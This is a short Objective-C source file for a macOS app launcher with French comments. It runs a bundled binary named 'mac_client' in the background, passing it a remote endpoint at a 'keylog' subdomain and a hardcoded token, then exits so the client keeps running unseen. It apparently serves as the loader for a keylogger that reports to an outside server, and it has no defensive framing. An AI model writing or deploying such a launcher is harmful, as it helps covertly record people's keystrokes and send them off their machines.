#import <Cocoa/Cocoa.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        // Cherche mac_client dans le bundle .app
        NSString *clientPath = [[NSBundle mainBundle] pathForResource:@"mac_client" ofType:nil];
        if (!clientPath) {
            NSLog(@"mac_client introuvable dans le bundle");
            return 1;
        }

        NSTask *task = [[NSTask alloc] init];
        task.launchPath = clientPath;
        task.arguments = @[
            @"https://api.keylog.claverie.site",
            @"72UsPl9QtgelVRbJ44u-G6hcNiSIWx64MEOWcmcCQ"
        ];

        @try {
            [task launch];
        } @catch (NSException *e) {
            NSLog(@"Erreur au lancement de mac_client: %@", e);
            return 1;
        }
    }
    // Le launcher se termine, mac_client reste en arrière‑plan
    return 0;
}

